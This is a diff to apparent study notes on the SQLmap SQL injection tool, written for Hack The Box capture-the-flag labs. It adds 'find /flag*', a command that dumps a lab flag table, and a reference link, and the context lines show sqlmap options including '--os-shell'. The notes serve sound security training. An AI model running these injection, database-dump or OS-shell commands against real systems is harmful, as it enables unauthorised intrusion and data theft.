@@ -1,4 +1,6 @@
 # [SQLmap](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
+- `ls -la`
+- `find /flag*`
 - Run it via taskbar or with 'sqlmap' or `python sqlmap.py` in terminal
 - advanced help is `-hh`
 - The technique characters BEUSTQ refers to the following:
@@ -38,6 +40,8 @@
 - HTTP Headers: `sqlmap -u "http://example.com/page.php" --headers="X-Forwarded-For: 127.0.0.1*"`
 - For JSON data: `sqlmap -u "http://example.com/api" --data '{"id":1}' --content-type="application/json"`
 
+- Worked quickly for case 7: `--batch -dbms MySQL --union-cols=5 -D testdb -T flag7 --dump --no-cast --flush-session`
+
 # Cheat Sheet
 
 | **Command** | **Description** |
@@ -70,3 +74,4 @@
 | `sqlmap -u "http://www.example.com/?id=1" --os-shell` | Spawning an OS shell |
 
 - https://www.zwarts-sec.com/posts/Hack-The-Box-SQLMap-Essentials/
+- https://github.com/missteek/cpts-quick-references/blob/main/module/sqlmap%20Essentials.md
